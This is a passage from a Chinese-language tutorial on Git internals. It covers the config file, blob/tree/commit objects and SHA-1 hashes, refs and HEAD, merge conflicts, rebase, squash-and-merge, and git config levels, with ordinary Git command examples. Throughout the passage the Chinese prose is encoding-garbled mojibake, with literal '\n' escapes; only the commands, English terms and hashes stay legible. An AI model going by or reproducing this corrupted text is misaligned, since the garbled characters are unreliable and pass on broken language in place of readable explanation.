æ˜¯ä»“åº“çš„é…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªå…¸å‹çš„é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼Œæˆ‘ä»¬åˆ›å»ºçš„è¿œç«¯ï¼Œåˆ†æ”¯éƒ½åœ¨ç­‰ä¿¡æ¯éƒ½åœ¨é…ç½®æ–‡ä»¶é‡Œæœ‰è¡¨ç°ï¼›fetch æ“ä½œçš„è¡Œä¸ºä¹Ÿæ˜¯åœ¨è¿™é‡Œé…ç½®çš„ï¼š\n[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true [remote \"origin\"] url = git@github.com:yanhaijing/zepto.fullpage.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master [branch \"dev\"] remote = origin merge = refs/heads/dev objects ç›®å½• Git å¯ä»¥é€šè¿‡ä¸€ç§ç®—æ³•å¯ä»¥å¾—åˆ°ä»»æ„æ–‡ä»¶çš„ â€œæŒ‡çº¹â€ï¼ˆ40 ä½ 16 è¿›åˆ¶æ•°å­—ï¼‰ï¼Œç„¶åé€šè¿‡æ–‡ä»¶æŒ‡çº¹å­˜å–æ•°æ®ï¼Œå­˜å–çš„æ•°æ®éƒ½ä½äº objects ç›®å½•ã€‚\nä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡æœ¬æ–‡ä»¶å¹¶ä½¿ç”¨ git add . å‘½ä»¤æ¥è§‚å¯Ÿ .git æ–‡ä»¶å¤¹å‡ºç°çš„å˜åŒ–ï¼š\n1 2  $ touch test.txt $ git add .   git add . å‘½ä»¤å°±æ˜¯ç”¨äºæŠŠå½“å‰æ–°å¢çš„å˜åŒ–æ·»åŠ è¿› Git æœ¬åœ°ä»“åº“çš„ï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨åï¼Œæˆ‘ä»¬æƒŠå¥‡çš„å‘ç° .git ç›®å½•ä¸‹çš„ objects/ ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªç›®å½•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  $ tree -a . â”œâ”€â”€ .git â”‚ â”œâ”€â”€ HEAD â”‚ â”œâ”€â”€ branches â”‚ â”œâ”€â”€ config â”‚ â”œâ”€â”€ description â”‚ â”œâ”€â”€ hooks â”‚ â”‚ â”œâ”€â”€ èŠ‚çœç¯‡å¹…..çœç•¥.. â”‚ â”œâ”€â”€ index â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ exclude â”‚ â”œâ”€â”€ objects â”‚ â”‚ â”œâ”€â”€ .DS_Store â”‚ â”‚ â”œâ”€â”€ e6 â”‚ â”‚ â”‚ â””â”€â”€ 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 â”‚ â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ pack â”‚ â””â”€â”€ refs â”‚ â”œâ”€â”€ heads â”‚ â””â”€â”€ tags â””â”€â”€ test.txt   æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ git hash-object test.txt å‘½ä»¤æ¥çœ‹çœ‹åˆšæ‰æˆ‘ä»¬åˆ›å»ºçš„ test.txt çš„ â€œæ–‡ä»¶æŒ‡çº¹â€ï¼š\n1 2  $ git hash-object test.txt e69de29bb2d1d6434b8b29ae775ad8c2e48c5391   è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæ–°åˆ›å»ºçš„ç›®å½• e6 å…¶å®æ˜¯è¯¥æ–‡ä»¶å“ˆå¸Œå€¼çš„å‰ä¸¤ä½ï¼Œè¿™å…¶å®æ˜¯ Git åšçš„ä¸€å±‚ç±»ä¼¼äºç´¢å¼•ä¸€æ ·çš„ä¸œè¥¿ï¼Œå¹¶ä¸”é»˜è®¤é‡‡ç”¨ 16 è¿›åˆ¶çš„ä¸¤ä½æ•°æ¥å½“ç´¢å¼•ï¼Œæ˜¯éå¸¸åˆé€‚çš„ã€‚\nè¿™è¾¹å…¶å®å¼•å…¥äº†Sha-1ç®—æ³•\nSHA-1å°†æ–‡ä»¶ä¸­çš„å†…å®¹é€šè¿‡é€šè¿‡è®¡ç®—ç”Ÿæˆä¸€ä¸ª 40 ä½é•¿åº¦çš„hashå€¼ã€‚\nSha-1çš„éå¸¸æœ‰ç‰¹ç‚¹ï¼š\n ç”±æ–‡ä»¶å†…å®¹è®¡ç®—å‡ºçš„hashå€¼ hashå€¼ç›¸åŒï¼Œæ–‡ä»¶å†…å®¹ç›¸åŒ  å¯¹äºæ·»åŠ çš„å†…å®¹ï¼Œæ— è®ºæˆ‘ä»¬æ‰§è¡Œå¤šå°‘æ¬¡ï¼Œéƒ½ä¼šå¾—åˆ°ç›¸åŒçš„ç»“æœã€‚å› æ­¤ï¼Œæ–‡ä»¶çš„sha-1å€¼æ˜¯å¯ä»¥ä½œä¸ºæ–‡ä»¶çš„å”¯ä¸€ id ã€‚åŒæ—¶ï¼Œå®ƒè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„åŠŸèƒ½ï¼Œæ ¡éªŒæ–‡ä»¶å®Œæ•´æ€§ã€‚\nobjects ç›®å½•ä¸‹æœ‰ 3 ç§ç±»å‹çš„æ•°æ®ï¼š\n Blobï¼› Tree; Commitï¼›  æ–‡ä»¶éƒ½è¢«å­˜å‚¨ä¸º blob ç±»å‹çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹è¢«å­˜å‚¨ä¸º tree ç±»å‹çš„æ–‡ä»¶ï¼Œåˆ›å»ºçš„æäº¤èŠ‚ç‚¹è¢«å­˜å‚¨ä¸º Commit ç±»å‹çš„æ•°æ®ï¼›\nä¸€èˆ¬æˆ‘ä»¬ç³»ç»Ÿä¸­çš„ç›®å½•(tree)ï¼Œåœ¨ Git ä¼šåƒä¸‹é¢è¿™æ ·å­˜å‚¨ï¼š\nè€Œ Commit ç±»å‹çš„æ•°æ®åˆ™æ•´åˆäº† tree å’Œ blob ç±»å‹ï¼Œä¿å­˜äº†å½“å‰çš„æ‰€æœ‰å˜åŒ–ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å†åœ¨åˆšæ‰çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå¹¶æ·»åŠ ä¸€äº›æ–‡ä»¶è¯•è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  $ mkdir test $ touch test/test.file $ tree -a . â”œâ”€â”€ .git â”‚ â”œâ”€â”€ HEAD â”‚ â”œâ”€â”€ branches â”‚ â”œâ”€â”€ config â”‚ â”œâ”€â”€ description â”‚ â”œâ”€â”€ hooks â”‚ â”‚ â”œâ”€â”€ èŠ‚çœç¯‡å¹…..çœç•¥.. â”‚ â”œâ”€â”€ index â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ exclude â”‚ â”œâ”€â”€ objects â”‚ â”‚ â”œâ”€â”€ .DS_Store â”‚ â”‚ â”œâ”€â”€ e6 â”‚ â”‚ â”‚ â””â”€â”€ 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 â”‚ â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ pack â”‚ â””â”€â”€ refs â”‚ â”œâ”€â”€ heads â”‚ â””â”€â”€ tags â”œâ”€â”€ test â”‚ â””â”€â”€ test.file â””â”€â”€ test.txt   æäº¤å®ŒCommitåœ¨è§‚å¯Ÿå˜åŒ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  $ git commit -a -m \"test: æ–°å¢æµ‹è¯•æ–‡ä»¶å¤¹å’Œæµ‹è¯•æ–‡ä»¶è§‚å¯Ÿ.gitæ–‡ä»¶çš„å˜åŒ–\" [master (root-commit) 30d51b1] test: æ–°å¢æµ‹è¯•æ–‡ä»¶å¤¹å’Œæµ‹è¯•æ–‡ä»¶è§‚å¯Ÿ.gitæ–‡ä»¶çš„å˜åŒ– 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 test.txt $ tree -a . â”œâ”€â”€ .git â”‚ â”œâ”€â”€ COMMIT_EDITMSG â”‚ â”œâ”€â”€ HEAD â”‚ â”œâ”€â”€ branches â”‚ â”œâ”€â”€ config â”‚ â”œâ”€â”€ description â”‚ â”œâ”€â”€ hooks â”‚ â”‚ â”œâ”€â”€ ...çœç•¥... â”‚ â”œâ”€â”€ index â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ exclude â”‚ â”œâ”€â”€ logs â”‚ â”‚ â”œâ”€â”€ HEAD â”‚ â”‚ â””â”€â”€ refs â”‚ â”‚ â””â”€â”€ heads â”‚ â”‚ â””â”€â”€ master â”‚ â”œâ”€â”€ objects â”‚ â”‚ â”œâ”€â”€ .DS_Store â”‚ â”‚ â”œâ”€â”€ 30 â”‚ â”‚ â”‚ â””â”€â”€ d51b1edd2efd551dd6bd52d4520487b5708c0e â”‚ â”‚ â”œâ”€â”€ 5e â”‚ â”‚ â”‚ â””â”€â”€ fb9bc29c482e023e40e0a2b3b7e49cec842034 â”‚ â”‚ â”œâ”€â”€ e6 â”‚ â”‚ â”‚ â””â”€â”€ 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 â”‚ â”‚ â”œâ”€â”€ info â”‚ â”‚ â””â”€â”€ pack â”‚ â””â”€â”€ refs â”‚ â”œâ”€â”€ heads â”‚ â”‚ â””â”€â”€ master â”‚ â””â”€â”€ tags â”œâ”€â”€ test â”‚ â””â”€â”€ test.file â””â”€â”€ test.txt   é¦–å…ˆæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°æˆ‘ä»¬æäº¤äº†ä¸€ä¸ª Commit çš„æ—¶å€™åœ¨ç¬¬ä¸€å¥è¯é‡Œé¢è¿”å›äº†ä¸€ä¸ªçŸ­çš„åƒæ˜¯å“ˆå¸Œå€¼ä¸€æ ·çš„ä¸œè¥¿ï¼š [master (root-commit) 30d51b1] ä¸­ çš„ 30d51b1ï¼Œå¯¹åº”çš„æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ objects æ‰¾åˆ°åˆšæ‰ commit çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ git cat-file -p å‘½ä»¤è¾“å‡ºä¸€ä¸‹å½“å‰æ–‡ä»¶çš„å†…å®¹ï¼š\n1 2 3 4 5 6 7  $ git cat-file -p 30d5 tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034 author æˆ‘æ²¡æœ‰ä¸‰é¢—å¿ƒè„ 1565742122 +0800 committer æˆ‘æ²¡æœ‰ä¸‰é¢—å¿ƒè„ 1565742122 +0800 test: æ–°å¢æµ‹è¯•æ–‡ä»¶å¤¹å’Œæµ‹è¯•æ–‡ä»¶è§‚å¯Ÿ.gitæ–‡ä»¶çš„å˜åŒ–   æˆ‘ä»¬å‘ç°è¿™é‡Œé¢æœ‰æäº¤çš„å†…å®¹ä¿¡æ¯ã€ä½œè€…ä¿¡æ¯ã€æäº¤è€…ä¿¡æ¯ä»¥åŠ commit messageï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥çœ‹åˆ°æäº¤çš„å†…å®¹å…·ä½“æœ‰å“ªäº›ï¼š\n1 2  $ git cat-file -p 5efb 100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 test.txt   æˆ‘ä»¬å†è¯•ç€æäº¤ä¸€ä¸ª commit æ¥è§‚å¯Ÿå˜åŒ–:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ touch test/test2.file $ git commit -a -m \"test: æ–°å¢åŠ ä¸€ä¸ª commit ä»¥è§‚å¯Ÿå˜åŒ–.\" [master 9dfabac] test: æ–°å¢åŠ ä¸€ä¸ª commit ä»¥è§‚å¯Ÿå˜åŒ–. 2 files changed, 0 insertions(+), 0 deletions(-) create mode 100644 test/test.file create mode 100644 test/test2.file $ git cat-file -p 9dfabac tree c562bfb9441352f4c218b0028148289f1ea7d7cd parent 30d51b1edd2efd551dd6bd52d4520487b5708c0e author é¾™æ»” 1565878699 +0800 committer é¾™æ»” 1565878699 +0800 test: æ–°å¢åŠ ä¸€ä¸ª commit ä»¥è§‚å¯Ÿå˜åŒ–.   å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸€æ¬¡çš„ commit å¤šäº†ä¸€ä¸ª parent çš„è¡Œï¼Œå…¶ä¸­çš„ â€œæŒ‡çº¹â€ å’Œä¸Šä¸€æ¬¡çš„ commit ä¸€æ¨¡ä¸€æ ·ï¼Œå½“æˆ‘ä»¬æäº¤ä¸¤ä¸ª commit ä¹‹åæˆ‘ä»¬çš„ Git ä»“åº“å¯ä»¥ç®€åŒ–ä¸ºä¸‹å›¾ï¼š\n è¯´æ˜ï¼šå…¶ä¸­å› ä¸ºæˆ‘ä»¬ test æ–‡ä»¶å¤¹æ–°å¢äº†æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å‡ºç°äº†å˜åŒ–ï¼Œæ‰€ä»¥å°±è¢«æ ‡è¯†æˆäº†æ–°çš„ tree ç±»å‹çš„å¯¹è±¡ï¼›  refs ç›®å½• refs ç›®å½•å­˜å‚¨éƒ½æ˜¯å¼•ç”¨æ–‡ä»¶ï¼Œå¦‚æœ¬åœ°åˆ†æ”¯ï¼Œè¿œç«¯åˆ†æ”¯ï¼Œæ ‡ç­¾ç­‰\n refs/heads/xxx æœ¬åœ°åˆ†æ”¯ refs/remotes/origin/xxx è¿œç«¯åˆ†æ”¯ refs/tags/xxx æœ¬åœ°tag  å¼•ç”¨æ–‡ä»¶çš„å†…å®¹éƒ½æ˜¯ 40 ä½é•¿åº¦çš„ commit\n1 2  $ cat .git/refs/heads/master 9dfabac68470a588a4b4a78742249df46438874a   è¿™å°±åƒæ˜¯ä¸€ä¸ªæŒ‡é’ˆä¸€æ ·ï¼Œå®ƒæŒ‡å‘äº†ä½ çš„æœ€åä¸€æ¬¡æäº¤ï¼ˆä¾‹å¦‚è¿™é‡Œå°±æŒ‡å‘äº†ç¬¬äºŒæ¬¡æäº¤çš„ commitï¼‰ï¼Œæˆ‘ä»¬è¡¥å……ä¸Šåˆ†æ”¯ä¿¡æ¯ï¼Œç°åœ¨çš„ Git ä»“åº“å°±ä¼šåƒä¸‹å›¾æ‰€ç¤ºï¼š\nHEAD ç›®å½• HEAD ç›®å½•ä¸‹å­˜å‚¨çš„æ˜¯å½“å‰æ‰€åœ¨çš„ä½ç½®ï¼Œå…¶å†…å®¹æ˜¯åˆ†æ”¯çš„åç§°ï¼š\n1 2  $ cat HEAD ref: refs/heads/master   æˆ‘ä»¬å†è¡¥å……ä¸Š HEAD çš„ä¿¡æ¯ï¼Œç°åœ¨çš„ Git ä»“åº“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\ngitçš„å†²çªå¤„ç† ä»¥ä¸‹ä¸»è¦å‚è€ƒä»¥ä¸‹ä¸¤ç¯‡æ–‡ç« \n gitå†²çªå¤„ç†å›¾è§£\nä½¿ç”¨åŸç†è§†è§’çœ‹ Git\n è®²å®Œgitçš„ç›®å½•ç»“æ„ï¼Œæˆ‘ä»¬å¯çŸ¥é“åˆ†æ”¯åœ¨gitä¸­ä»…æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯åœ¨åˆ†å¸ƒå¼å·¥ä½œä¸­ï¼Œæ— å¯é¿å…çš„ä¼šé‡è§å†²çªï¼ˆåˆ†æ”¯çš„åˆå¹¶ï¼‰\nå›¾ä¸Šçš„æƒ…å†µï¼Œå¹¶ä¸æ˜¯ç§»åŠ¨åˆ†æ”¯æŒ‡é’ˆå°±èƒ½å¤Ÿè§£å†³é—®é¢˜çš„ï¼Œå®ƒéœ€è¦ä¸€ç§åˆå¹¶ç­–ç•¥ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ç¡®çš„æ˜¯è°ä¸è°çš„åˆå¹¶ï¼Œæ˜¯ 2ï¼Œ3 ä¸ 4ï¼Œ 5ï¼Œ 6 ä¸¤æ¡çº¿çš„åˆå¹¶å—ï¼Ÿå…¶å®å¹¶ä¸æ˜¯çš„ï¼ŒçœŸå®åˆå¹¶çš„å…¶å®åªæœ‰ 3 å’Œ 6ï¼Œå› ä¸ºæ¯ä¸€æ¬¡çš„æäº¤éƒ½åŒ…å«äº†é¡¹ç›®å®Œæ•´çš„å¿«ç…§ï¼Œå³åˆå¹¶åªæ˜¯ tree ä¸ tree çš„åˆå¹¶ã€‚\nè¿™å¯èƒ½è¯´èµ·æ¥æœ‰ç‚¹ç»•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ¥æƒ³ä¸€ä¸ªç®€å•çš„ç®—æ³•ï¼Œç”¨æ¥æ¯”è¾ƒ 3 å’Œ 6 çš„ä¸åŒã€‚å¦‚æœæˆ‘ä»¬åªæ˜¯å•çº¯çš„æ¯”è¾ƒ 3 å’Œ 6 çš„ä¿¡æ¯ï¼Œå…¶å®å¹¶æ²¡æœ‰æ„ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¹‹é—´å¹¶ä¸èƒ½ç¡®åˆ‡çš„è¡¨è¾¾å‡ºå½“å‰çš„å†²çªçŠ¶æ€ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦é€‰å–å®ƒä»¬ä¸¤ä¸ªåˆ†æ”¯çš„åˆ†æ­§ç‚¹ï¼ˆmerge baseï¼‰ä½œä¸ºå‚è€ƒç‚¹ï¼Œè¿›è¡Œæ¯”è¾ƒã€‚\né¦–å…ˆæˆ‘ä»¬æŠŠ 1 ä½œä¸ºåŸºç¡€ï¼Œç„¶åæŠŠ 1ã€3ã€6 ä¸­æ‰€æœ‰çš„æ–‡ä»¶åšä¸€ä¸ªåˆ—è¡¨ï¼Œç„¶åä¾æ¬¡éå†è¿™ä¸ªåˆ—è¡¨ä¸­çš„æ–‡ä»¶ã€‚æˆ‘ä»¬ç°åœ¨æ‹¿åˆ—è¡¨ä¸­çš„ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œä¸¾ä¾‹ï¼ŒæŠŠåœ¨æäº¤åœ¨ 1ã€3ã€6 ä¸­çš„è¯¥æ–‡ä»¶åˆ†åˆ«ç§°ä¸ºç‰ˆæœ¬1ã€ç‰ˆæœ¬3ã€ç‰ˆæœ¬6ï¼Œå¯èƒ½å‡ºç°å¦‚ä¸‹å‡ ç§æƒ…å†µï¼š\n**1. ç‰ˆæœ¬ 1ã€ç‰ˆæœ¬ 3ã€ç‰ˆæœ¬ 6 çš„ â€œæŒ‡çº¹â€ å€¼éƒ½ç›¸åŒï¼š**è¿™ç§æƒ…å†µåˆ™è¯´æ˜æ²¡æœ‰å†²çªï¼› **2. ç‰ˆæœ¬ 3 or ç‰ˆæœ¬ 6 è‡³å°‘æœ‰ä¸€ä¸ªä¸ç‰ˆæœ¬ 1 çŠ¶æ€ç›¸åŒï¼ˆæŒ‡çš„æ˜¯æŒ‡çº¹å€¼ç›¸åŒæˆ–éƒ½ä¸å­˜åœ¨ï¼‰ï¼š**è¿™ç§æƒ…å†µå¯ä»¥è‡ªåŠ¨åˆå¹¶ï¼Œæ¯”å¦‚ç‰ˆæœ¬ 1 ä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨ç‰ˆæœ¬ 3 ä¸­æ²¡æœ‰å¯¹è¯¥æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œè€Œç‰ˆæœ¬ 6 ä¸­åˆ é™¤äº†è¿™ä¸ªæ–‡ä»¶ï¼Œåˆ™ä»¥ç‰ˆæœ¬ 6 ä¸ºå‡†å°±å¯ä»¥äº†ï¼› **3. ç‰ˆæœ¬ 3 or ç‰ˆæœ¬ 6 éƒ½ä¸ç‰ˆæœ¬ 1 çš„çŠ¶æ€ä¸åŒï¼š**è¿™ç§æƒ…å†µå¤æ‚ä¸€äº›ï¼Œè‡ªåŠ¨åˆå¹¶ç­–ç•¥å¾ˆéš¾ç”Ÿæ•ˆäº†ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è§£å†³ï¼›\nmerge æ“ä½œ åœ¨è§£å†³å®Œå†²çªåï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¿®æ”¹çš„å†…å®¹æäº¤ä¸ºä¸€ä¸ªæ–°çš„æäº¤ï¼Œè¿™å°±æ˜¯ mergeã€‚\nå¯ä»¥çœ‹åˆ° merge æ˜¯ä¸€ç§ä¸ä¿®æ”¹åˆ†æ”¯å†å²æäº¤è®°å½•çš„æ–¹å¼ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ–¹å¼ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼åœ¨æŸäº›æƒ…å†µä¸‹ä½¿ç”¨èµ·æ¥ä¸å¤ªæ–¹ä¾¿ï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºäº†ä¸€äº›æäº¤å‘é€ç»™ç®¡ç†è€…ï¼Œç®¡ç†è€…åœ¨åˆå¹¶æ“ä½œä¸­äº§ç”Ÿäº†å†²çªï¼Œè¿˜éœ€è¦å»è§£å†³å†²çªï¼Œè¿™æ— ç–‘å¢åŠ äº†ä»–äººçš„è´Ÿæ‹…ã€‚\nè€Œæˆ‘ä»¬ä½¿ç”¨ rebase å¯ä»¥è§£å†³è¿™ç§é—®é¢˜ã€‚\nrebase æ“ä½œ å‡è®¾æˆ‘ä»¬çš„åˆ†æ”¯ç»“æ„å¦‚ä¸‹ï¼š\nrebase ä¼šæŠŠä» Merge Base ä»¥æ¥çš„æ‰€æœ‰æäº¤ï¼Œä»¥è¡¥ä¸çš„å½¢å¼ä¸€ä¸ªä¸€ä¸ªé‡æ–°æ‰“åˆ°ç›®æ ‡åˆ†æ”¯ä¸Šã€‚è¿™ä½¿å¾—ç›®æ ‡åˆ†æ”¯åˆå¹¶è¯¥åˆ†æ”¯çš„æ—¶å€™ä¼šç›´æ¥ Fast Forwardï¼ˆå¯ä»¥ç®€å•ç†è§£ä¸ºç›´æ¥åç§»æŒ‡é’ˆï¼‰ï¼Œå³ä¸ä¼šäº§ç”Ÿä»»ä½•å†²çªã€‚æäº¤å†å²æ˜¯ä¸€æ¡çº¿ï¼Œè¿™å¯¹å¼ºè¿«ç—‡æ‚£è€…å¯è°“æ˜¯ä¸€å¤§ç¦éŸ³ã€‚\nå…¶å® rebase ä¸»è¦æ˜¯åœ¨ .git/rebase-merge ä¸‹ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º git-rebase-todo å’Œ done æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ä½œç”¨å…‰çœ‹åå­—å°±å¤§æ¦‚èƒ½å¤Ÿçœ‹å¾—å‡ºæ¥ã€‚git-rebase-todo ä¸­å­˜æ”¾äº† rebase å°†è¦æ“ä½œçš„ commitï¼Œè€Œ done å­˜æ”¾æ­£æ“ä½œæˆ–å·²æ“ä½œå®Œæ¯•çš„ commitï¼Œæ¯”å¦‚æˆ‘ä»¬è¿™é‡Œï¼Œgit-rebase-todo å­˜æ”¾äº† 4ã€5ã€6 ä¸‰ä¸ªæäº¤ã€‚\né¦–å…ˆ Git ä¼šæŠŠ 4 è¿™ä¸ª commit æ”¾å…¥ doneï¼Œè¡¨ç¤ºæ­£åœ¨æ“ä½œ 4ï¼Œç„¶åå°† 4 ä»¥è¡¥ä¸çš„æ–¹å¼æ‰“åˆ° 3 ä¸Šï¼Œå½¢æˆäº†æ–°çš„ 4`ï¼Œè¿™ä¸€æ­¥æ˜¯å¯èƒ½äº§ç”Ÿå†²çªçš„ï¼Œå¦‚æœæœ‰å†²çªï¼Œéœ€è¦è§£å†³å†²çªä¹‹åæ‰èƒ½ç»§ç»­æ“ä½œã€‚\næ¥ç€æŒ‰åŒæ ·çš„æ–¹å¼æŠŠ 5ã€6 éƒ½æ”¾å…¥ doneï¼Œæœ€åæŠŠæŒ‡é’ˆç§»åŠ¨åˆ°æœ€æ–°çš„æäº¤ 6 ä¸Šï¼Œå°±å®Œæˆäº† rebase çš„æ“ä½œã€‚\n**ä»åˆšæ‰çš„å›¾ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ° rebase çš„ä¸€ä¸ªç¼ºç‚¹ï¼Œé‚£å°±æ˜¯ä¿®æ”¹äº†åˆ†æ”¯çš„å†å²æäº¤ã€‚**å¦‚æœå·²ç»å°†åˆ†æ”¯æ¨é€åˆ°äº†è¿œç¨‹ä»“åº“ï¼Œä¼šå¯¼è‡´æ— æ³•å°†ä¿®æ”¹åçš„åˆ†æ”¯æ¨é€ä¸Šå»ï¼Œå¿…é¡»ä½¿ç”¨ -f å‚æ•°ï¼ˆforceï¼‰å¼ºè¡Œæ¨é€ã€‚\næ‰€ä»¥ä½¿ç”¨ rebase æœ€å¥½ä¸è¦åœ¨å…¬å…±åˆ†æ”¯ä¸Šè¿›è¡Œæ“ä½œã€‚\nSquash and Merge æ“ä½œ ç®€å•è¯´å°±æ˜¯å‹ç¼©æäº¤ï¼ŒæŠŠå¤šæ¬¡çš„æäº¤èåˆåˆ°ä¸€ä¸ª commit ä¸­ï¼Œè¿™æ ·çš„å¥½å¤„ä¸è¨€è€Œå–»ï¼Œæˆ‘ä»¬ç€é‡æ¥è®¨è®ºä¸€ä¸‹å®ç°çš„æŠ€æœ¯ç»†èŠ‚ï¼Œè¿˜æ˜¯ä»¥æˆ‘ä»¬ä¸Šé¢æœ€å¼€å§‹çš„åˆ†æ”¯æƒ…å†µä¸ºä¾‹ï¼Œé¦–å…ˆï¼ŒGit ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶åˆ†æ”¯ï¼ŒæŒ‡å‘å½“å‰ feature çš„æœ€æ–° commitã€‚\nç„¶åæŒ‰ç…§ä¸Šé¢ rebase çš„æ–¹å¼ï¼Œå˜åŸºåˆ° master çš„æœ€æ–° commit å¤„ã€‚\næ¥ç€ç”¨ rebase æ¥ squash ä¹‹ï¼Œå‹ç¼©è¿™äº›æäº¤ä¸ºä¸€ä¸ªæäº¤ã€‚\næœ€åä»¥ fast forward çš„æ–¹å¼åˆå¹¶åˆ° master ä¸­ã€‚\nå¯è§æ­¤æ—¶ master åˆ†æ”¯å¤šä¸”åªå¤šäº†ä¸€ä¸ªæè¿°äº†è¿™æ¬¡æ”¹åŠ¨çš„æäº¤ï¼Œè¿™å¯¹äºå¤§å‹å·¥ç¨‹ï¼Œä¿æŒä¸»åˆ†æ”¯çš„ç®€æ´æ˜“æ‡‚æœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚\ngitåŸºæœ¬æ“ä½œ gité…ç½® Git æä¾›äº†ä¸€ä¸ªå«åš git config çš„å·¥å…·ï¼Œä¸“é—¨ç”¨æ¥é…ç½®æˆ–è¯»å–ç›¸åº”çš„å·¥ä½œç¯å¢ƒå˜é‡ã€‚ è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå†³å®šäº† Git åœ¨å„ä¸ªç¯èŠ‚çš„å…·ä½“å·¥ä½œæ–¹å¼å’Œè¡Œä¸ºã€‚è¿™äº›å˜é‡å¯ä»¥å­˜æ”¾åœ¨ä»¥ä¸‹ä¸‰ä¸ªä¸åŒçš„åœ°æ–¹ï¼š\n /etc/gitconfig æ–‡ä»¶ï¼šç³»ç»Ÿä¸­å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½æ™®éé€‚ç”¨çš„é…ç½®ã€‚è‹¥ä½¿ç”¨ git config æ—¶ç”¨ â€“system é€‰é¡¹ï¼Œè¯»å†™çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ã€‚ ~/.gitconfig æ–‡ä»¶ï¼šç”¨æˆ·ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶åªé€‚ç”¨äºè¯¥ç”¨æˆ·ã€‚è‹¥ä½¿ç”¨ git config æ—¶ç”¨ â€“global é€‰é¡¹ï¼Œè¯»å†™çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ã€‚ å½“å‰é¡¹ç›®çš„ Git ç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯å·¥ä½œç›®å½•ä¸­çš„ .git/config æ–‡ä»¶ï¼‰ï¼šè¿™é‡Œçš„é…ç½®ä»…ä»…é’ˆå¯¹å½“å‰é¡¹ç›®æœ‰æ•ˆã€‚æ¯ä¸€ä¸ªçº§åˆ«çš„é…ç½®éƒ½ä¼šè¦†ç›–ä¸Šå±‚çš„ç›¸åŒé…ç½®ï¼Œæ‰€ä»¥ .git/config é‡Œçš„é…ç½®ä¼šè¦†ç›– /etc/gitconfig ä¸­çš„åŒåå˜é‡ã€‚\nåœ¨ Windows ç³»ç»Ÿä¸Šï¼ŒGit ä¼šæ‰¾å¯»ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ .gitconfig æ–‡ä»¶ã€‚ä¸»ç›®å½•å³ $HOME å˜é‡æŒ‡å®šçš„ç›®å½•ï¼Œä¸€èˆ¬éƒ½æ˜¯ C:\\Documents and Settings$USERã€‚\næ­¤å¤–ï¼ŒGit è¿˜ä¼šå°è¯•æ‰¾å¯» /etc/gitconfig æ–‡ä»¶ï¼Œåªä¸è¿‡çœ‹å½“åˆ Git 